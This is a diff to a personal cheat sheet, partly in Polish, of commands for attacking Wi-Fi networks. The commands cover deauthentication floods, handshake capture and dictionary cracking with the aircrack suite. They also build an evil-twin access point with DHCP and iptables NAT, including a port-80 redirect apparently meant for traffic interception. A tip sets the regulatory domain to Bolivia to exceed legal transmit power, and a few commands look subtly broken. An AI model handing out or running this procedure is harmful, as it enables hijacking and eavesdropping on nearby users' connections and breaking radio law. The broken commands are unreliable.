@@ -22,20 +22,106 @@ Mode:Monitor - iwconfig wlan0 mode monitor
 iwconfig - elements of a wireless card: the ESSID, WEP keys, etc. 
 ifconfig - IP address, subnet mask etc
 
----------------------------Network Manager CLI-------------------------------
+-----------------------------Network Manager Conflict--------------------------------
+
+- gedit /etc/NetworkManager/NetworkManager.conf
+
+[keyfile]
+unmanaged-devices=interface-name:wlan0mon;interface-name:wlan1mon;interface-name:wlan2mon;interface-name:wlan3mon;interface-name:wlan4mon;interface-name:wlan5mon;interface-name:wlan6mon;interface-name:wlan7mon;interface-name:wlan8mon;interface-name:wlan9mon;interface-name:wlan10mon;interface-name:wlan11mon;interface-name:wlan12mon
+
+---------------------------Network Manager CLI---------------------------------
 
 - nmcli -f in-use,ssid,bssid,signal,bars  dev wifi
 - $ nmcli d wifi connect XX:XX:XX:XX:XX:XX
 
-------------------------------------KISMET------------------------------------
+------------------------------------KISMET-------------------------------------
 
 
 
 ---------------------------------PAKIET AIRCRACK--------------------------------
 
-- airmon-ng check
+- airmon-ng check--bss
 - airmon-ng check kill
 - airmon-ng wlan0 start
 - airodump-ng wlan0mon
 - airodump-ng -w FILE_NAME -c 11 --bssid MAC_ADDRESS
 - aireplay-ng --deauth 10 -a BSSID_MAC -c STATION_MAC wlan0mon
+- aircrack-ng -w SCIEZKA_DO_SLOWNIKA -b BSSID_MAC SCIEZKA_DO_CAPTURE
+
+------------------------------------TWIN AP------------------------------------
+
+- airmon-ng start wlan0
+- airodump-ng mon0
+- airbase-ng -a 12:13:14:6F:64:1E --essid "FreeNet" -c 11 mon0
+
+The 802.11 standard has a special frame called deauthentication that, as you might expect, deauthenticates everyone on the access point.
+When his computer tries to re-authenticate, he will automatically reconnect to the strongest AP with the ESSID of "Elroy."
+
+- aireplay-ng --deauth 0 -a 00:09:5B:6F:1E
+
+Note that we once again used his BSSID in the aireplay-ng command. 
+If our signal is stronger than his own AP, he will automatically reconnect to our evil twin!
+
+- iwconfig wlan0 txpower 27 (increase the power of our interface)
+- iwconfig wlan0 txpower 30 (30 dBm if it is to much it will dispaly error becuase of the law)
+
+- iw reg set BO (set to Bolivia law which allows to use full 1000 mWs of power)
+- iwconfig wlan0 txpower 30 
+
+-------------------------------AIRBASE-NG----------------------------------------
+
+- airbase-ng -a 45:45:45:45:45:45 -c 11 -e freewifi wlan0mon
+- airodump-ng -c 11 wlan0mon
+
+-------------------------------TWIN AP INTERFACE ----------------------------------------
+
+- ifconfig at0
+- ifconfig at0 up
+- ifconfig at0 mtu 1400
+- ifconfig at0 192.168.2.1 netmask 255.255.255.0
+- route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
+
+-------------------------------TWIN AP DHCP ----------------------------------------
+
+- dpkg -s isc-dhcp-server | grep Status
+- apt-get install isc-dhcp-server
+
+- gedit /etc/dhcp/dhcpd.conf
+
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.2.0 netmask 255.255.255.0
+
+{	
+option subnet-mask 255.255.255.0;
+option broadcast-address 192.168.2.255;
+option domain-name-servers 8.8.8.8;
+option routers 192.168.2.1;
+range 192.168.2.20 192.168.2.60;
+}
+
+- /etc/default/isc-dhcp-server:
+Interfacesv4="at0"
+
+- service isc-dhcp-server restart
+
+-------------------------------DHCP ISSUE----------------------------------------
+
+- systemctl status isc-dhcp-server.service
+
+- dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
+- pgrep dhcpd | xargs kill -9
+- rm /var/run/dhcpd.pid
+- systemctl start isc-dhcp-server
+
+-------------------------------IP TABLES NAT----------------------------------------
+
+iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.2.0
+iptables -P FORWARD ACCEPT
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+----------------------------ROUTING ON KALI--------------------------------------
+
+- echo 1 /proc/sys/net/ipv4/ip_forward
